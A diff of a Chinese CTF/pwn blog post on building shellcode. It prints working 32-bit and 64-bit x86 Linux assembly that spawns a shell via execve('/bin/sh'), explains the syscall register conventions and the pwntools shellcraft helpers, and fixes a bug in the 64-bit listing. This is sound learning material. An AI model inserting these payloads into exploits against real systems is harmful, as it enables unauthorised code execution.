@@ -16,20 +16,20 @@
   <meta name="author" content="Cheer">
   <meta name="keywords" content="">
   
-    <meta name="description" content="32位shellcode: 12345678xor    ecx,ecx;mul    ecx;push   ecx;push   0x68732f2f;push   0x6e69622f;mov    ebx,esp;mov    al,0xb;int    0x80;  32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX 其中，mul ecx;指令的作用为EDX:">
+    <meta name="description" content="值得注意的是，通过execve(&#39;&#x2F;bin&#x2F;sh&#39;,0,0)的方式调用shell，只对于zsh之外的shell有作用。 一般的方法为，使用execve(&#39;&#x2F;bin&#x2F;sh&#39;,0,0)调用shell。并且需要注意，该方案只对于zsh之外的shell有作用。(zsh好像破事一直比较多) 32位shellcode: 12345678xor    ecx,ecx;mul">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwn中shellcode的构建">
-<meta property="og:url" content="http://example.com/2022/04/13/Pwn%E4%B8%ADshellcode%E7%9A%84%E6%9E%84%E5%BB%BA/index.html">
+<meta property="og:title" content="Pwn中shellcode的构建及调用规范">
+<meta property="og:url" content="http://example.com/2022/04/13/Pwn%E4%B8%ADshellcode%E7%9A%84%E6%9E%84%E5%BB%BA%E5%8F%8A%E8%B0%83%E7%94%A8%E8%A7%84%E8%8C%83/index.html">
 <meta property="og:site_name" content="UCASCheer">
-<meta property="og:description" content="32位shellcode: 12345678xor    ecx,ecx;mul    ecx;push   ecx;push   0x68732f2f;push   0x6e69622f;mov    ebx,esp;mov    al,0xb;int    0x80;  32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX 其中，mul ecx;指令的作用为EDX:">
+<meta property="og:description" content="值得注意的是，通过execve(&#39;&#x2F;bin&#x2F;sh&#39;,0,0)的方式调用shell，只对于zsh之外的shell有作用。 一般的方法为，使用execve(&#39;&#x2F;bin&#x2F;sh&#39;,0,0)调用shell。并且需要注意，该方案只对于zsh之外的shell有作用。(zsh好像破事一直比较多) 32位shellcode: 12345678xor    ecx,ecx;mul">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-04-13T02:53:23.701Z">
-<meta property="article:modified_time" content="2022-06-07T12:00:42.766Z">
+<meta property="article:modified_time" content="2023-01-30T13:57:34.041Z">
 <meta property="article:author" content="Cheer">
 <meta name="twitter:card" content="summary_large_image">
   
   
-  <title>Pwn中shellcode的构建 - UCASCheer</title>
+  <title>Pwn中shellcode的构建及调用规范 - UCASCheer</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Pwn中shellcode的构建">
+            <span class="h2" id="subtitle" title="Pwn中shellcode的构建及调用规范">
               
             </span>
 
@@ -196,7 +196,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      650 字
+      943 字
     </span>
   
 
@@ -205,7 +205,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6 分钟
+      8 分钟
     </span>
   
 
@@ -234,24 +234,29 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Pwn中shellcode的构建</h1>
+            <h1 style="display: none">Pwn中shellcode的构建及调用规范</h1>
             
             <div class="markdown-body">
-              <p>32位shellcode:</p>
+              <p>值得注意的是，通过<code>execve(&#39;/bin/sh&#39;,0,0)</code>的方式调用shell，只对于zsh之外的shell有作用。</p>
+<p>一般的方法为，使用<code>execve(&#39;/bin/sh&#39;,0,0)</code>调用shell。并且需要注意，该方案只对于zsh之外的shell有作用。(zsh好像破事一直比较多)</p>
+<p>32位shellcode:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs assembly">xor    ecx,ecx;<br>mul    ecx;<br>push   ecx;<br>push   0x68732f2f;<br>push   0x6e69622f;<br>mov    ebx,esp;<br>mov    al,0xb;<br>int    0x80;<br></code></pre></td></tr></table></figure>
 
 <p>32位机器的系统调用，调用号在EAX，前面的参数依次在EBX, ECX, EDX</p>
 <p>其中，<code>mul ecx;</code>指令的作用为<code>EDX:EAX &lt;-- EAX * r/m32</code>，将EDX和EAX清零。</p>
+<p>进行普通过程调用时，参数放在栈上</p>
 <p>64位shellcode：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rdx, rdx;<br>mov     rbx, 0x68732f2f6e69622f;<br>push 	rdx;<br>mov     rdi, rsp;<br>xor 	rax, rax;<br>push    rdx;<br>mov     rsi, rsp;<br>mov 	rdx, rsp;<br>mov     al, 0x3b;<br>syscall;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">xor     rdx, rdx;<br>mov     rbx, 0x68732f2f6e69622f;<br>push 	rbx;<br>mov     rdi, rsp;<br>xor 	rax, rax;<br>push    rdx;<br>mov     rsi, rsp;<br>mov 	rdx, rsp;<br>mov     al, 0x3b;<br>syscall;<br></code></pre></td></tr></table></figure>
 
-<p>64位机器系统调用，调用号在RAX，前面的参数依次在RDI, DSI, RDX, RCX</p>
+<p>64位机器系统调用，调用号在RAX，前面的参数依次在RDI, RSI, RDX, RCX</p>
 <p>假设开始时rax为零了</p>
 <p>且rcx为零不需要保证</p>
+<p>进行普通过程调用时，参数依次放在RDI, RSI, RDX, RCX。</p>
 <p>构建时，使用context(os&#x3D;’linux’, arch&#x3D;’amd64’, bits&#x3D;’64’)设置环境，然后用asm(shellcraft.sh())构造shellcode。也可以用asm([汇编代码])生成shellcode。</p>
 <p>使用pwntools可以把其中的AT&amp;T转换成intel风格。</p>
 <p>使用gcc选择汇编格式生成汇编代码，使用选项-masm&#x3D;intel。</p>
 <p>使用objdump选择汇编格式，用&#96;objdump -M intel -d &lt;执行档&gt; </p>
+<p>再次强调，该方法为使用<code>execve(&#39;/bin/sh&#39;,0,0)</code>调用shell。并且需要注意，该方案只对于zsh之外的shell有作用。(zsh好像破事一直比较多)</p>
 
             </div>
             <hr>
@@ -289,8 +294,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/04/12/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E8%AE%B0%E5%BD%95%EF%BC%9A%E5%9F%BA%E4%BA%8ELLVMClang%E7%BC%96%E8%AF%91%E5%99%A8%E4%BD%BF%E7%94%A8%E5%8F%8A%E7%BC%96%E8%AF%91%E6%96%B9%E6%A1%88%E4%BC%98%E5%8C%96/">
-                        <span class="hidden-mobile">编译原理记录：基于LLVM/Clang编译器使用及编译方案优化</span>
+                      <a href="/2022/03/03/UCASCheer/">
+                        <span class="hidden-mobile">UCASCheer</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
